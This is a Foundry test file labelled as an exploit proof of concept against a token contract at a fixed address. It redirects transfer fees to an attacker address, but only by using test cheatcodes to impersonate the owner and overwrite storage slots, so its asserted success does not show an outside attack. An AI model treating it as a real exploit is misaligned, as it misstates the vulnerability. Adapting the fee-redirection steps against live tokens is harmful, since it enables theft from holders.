// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ILiquidityGeneratorToken {
    function excludeFromFee(address account) external;
    function setTaxFeePercent(uint256 taxFeeBps) external;
    function setLiquidityFeePercent(uint256 liquidityFeeBps) external;
    function setCharityFeePercent(uint256 charityFeeBps) external;
    function owner() external view returns (address);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xE2C9C976337357369845c761DD851E2B6942D69f;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(TARGET, address(this), 1000000 * 1e9);
        deal(TARGET, attacker, 1000000 * 1e9);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);

        address owner = ILiquidityGeneratorToken(TARGET).owner();
        vm.startPrank(owner);

        ILiquidityGeneratorToken(TARGET).excludeFromFee(attacker);
        ILiquidityGeneratorToken(TARGET).setTaxFeePercent(1000);
        ILiquidityGeneratorToken(TARGET).setLiquidityFeePercent(750);
        ILiquidityGeneratorToken(TARGET).setCharityFeePercent(750);

        vm.stopPrank();

        bytes32 inSwapSlot = bytes32(uint256(21));
        vm.store(TARGET, inSwapSlot, bytes32(uint256(1)));

        bytes32 charitySlot = bytes32(uint256(20));
        vm.store(TARGET, charitySlot, bytes32(uint256(uint160(attacker))));

        address victim = address(0x1337);
        deal(TARGET, victim, 10000 * 1e9);

        vm.prank(victim);
        IERC20(TARGET).transfer(attacker, 1000 * 1e9);

        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase from charity fees");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

